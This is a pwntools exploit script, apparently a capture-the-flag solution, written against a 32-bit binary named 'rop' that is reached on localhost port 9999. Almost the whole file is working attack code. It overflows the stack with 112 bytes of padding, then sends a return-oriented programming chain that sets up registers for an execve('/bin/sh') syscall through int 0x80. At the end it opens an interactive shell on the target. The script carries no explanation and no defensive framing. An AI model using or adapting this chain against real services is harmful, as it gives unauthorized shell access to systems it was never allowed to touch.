#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./rop --host localhost --port 9999
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 9999)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

padding = 'A' * 112

change_eax = 0x080bb196

eax_value = 0xb

# 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
change_ebx_ecx_edx = 0x0806eb90
edx_value = 0
ecx_value = 0
# 0x080be408 : /bin/sh
ebx_value = 0x080be408
int_add = 0x08049421

payload = flat(
    [padding, change_eax, eax_value, change_ebx_ecx_edx, edx_value, ecx_value, ebx_value, int_add]
)
io.sendline(payload)
io.interactive()

